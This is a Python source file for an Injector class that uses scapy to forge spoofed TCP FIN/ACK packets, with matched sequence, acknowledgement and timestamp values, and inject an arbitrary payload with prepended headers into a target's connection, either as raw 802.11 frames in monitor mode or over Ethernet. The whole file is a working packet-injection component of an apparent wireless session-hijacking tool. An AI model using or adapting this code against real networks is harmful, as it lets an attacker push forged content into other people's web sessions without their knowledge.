import scapy.arch
import time
from .headers import Headers
from .visuals import Bcolors
from scapy.config import conf
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.packet import Padding, Raw
from scapy.sendrecv import __gen_send as gs

class Injector(object):
    """Uses scapy to inject packets on the networks"""

    def __init__(self, interface, args):
        self.interface = interface
        self.args = args
        self.hdr = Headers()
        self.injSocket = conf.L2socket(iface = interface)
        if (args.m != args.i) or args.tun is True:
            self.injMac = scapy.arch.get_if_hwaddr(interface)

    def inject(self,
               tgtmac,
               rtrmac,
               dstmac,
               tgtip,
               svrip,
               tgtport,
               svrport,
               acknum,
               seqnum,
               injection,
               TSVal,
               TSecr):
        """Send the injection using Scapy

        This method is where the actual packet is created for sending things
        such as the payload and associated flags.

        FIN/ACK flag is sent to the target with this method.
        """

        ## Headers
        headers = self.hdr.default(injection)

        if self.args.tun is False:

            ## Monitor injection
            if self.args.inj == 'mon':
                packet = RadioTap()\
                         /Dot11(
                                FCfield = 'from-DS',
                                addr1 = tgtmac,
                                addr2 = rtrmac,
                                addr3 = dstmac
                               )\
                         /LLC()\
                         /SNAP()\
                         /IP(
                             dst = tgtip,
                             src = svrip
                            )\
                         /TCP(
                              flags = 'FA',
                              sport = int(svrport),
                              dport = int(tgtport),
                              seq = int(seqnum),
                              ack = int(acknum)
                             )\
                         /Raw(
                              load = headers + injection
                             )

                if TSVal is not None and TSecr is not None:
                    packet[TCP].options = [
                                           ('NOP', None),
                                           ('NOP', None),
                                           ('Timestamp', ((round(time.time()), TSVal)))
                                          ]
                else:
                    packet[TCP].options = [
                                           ('NOP', None),
                                           ('NOP', None),
                                           ('Timestamp', ((round(time.time()), 0)))
                                          ]
            ## Managed injection
            else:
                headers = self.hdr.default(injection)
                packet = Ether(
                               src = self.injMac,\
                               dst = tgtmac\
                              )\
                         /IP(
                             dst = tgtip,
                             src = svrip
                             )\
                         /TCP(
                              flags = 'FA',
                              sport = int(svrport),
                              dport = int(tgtport),
                              seq = int(seqnum),
                              ack = int(acknum)
                             )\
                         /Raw(
                              load = headers + injection
                             )

                if TSVal is not None:
                    packet[TCP].options = [\
                                          ('NOP', None),\
                                          ('NOP', None),\
                                          ('Timestamp', ((round(time.time()), TSVal)))\
                                          ]
                else:
                    packet[TCP].options = [\
                                          ('NOP', None),\
                                          ('NOP', None),\
                                          ('Timestamp', ((round(time.time()), 0)))\
                                          ]

        ## Managed
        else:
            try:
                headers = self.hdr.default(injection)
                packet = Ether(
                               src = self.injMac,\
                               dst = tgtmac\
                              )\
                         /IP(
                             dst = tgtip,
                             src = svrip
                            )\
                         /TCP(
                              flags = 'FA',
                              sport = int(svrport),
                              dport = int(tgtport),
                              seq = int(seqnum),
                              ack = int(acknum)
                             )\
                         /Raw(
                              load = headers + injection
                             )

                if TSVal is not None:
                    packet[TCP].options = [
                                           ('NOP', None),\
                                           ('NOP', None),\
                                           ('Timestamp', ((round(time.time()), TSVal)))\
                                          ]
                else:
                    packet[TCP].options = [
                                           ('NOP', None),\
                                           ('NOP', None),\
                                           ('Timestamp', ((round(time.time()), 0)))\
                                          ]
            except Exception as E:
                print(E)

        ## Inject
        try:
            gs(self.injSocket, packet, verbose = False)
            print('[*] Packet injected to {0}'.format(tgtmac))
        except Exception as E:
            print(E)
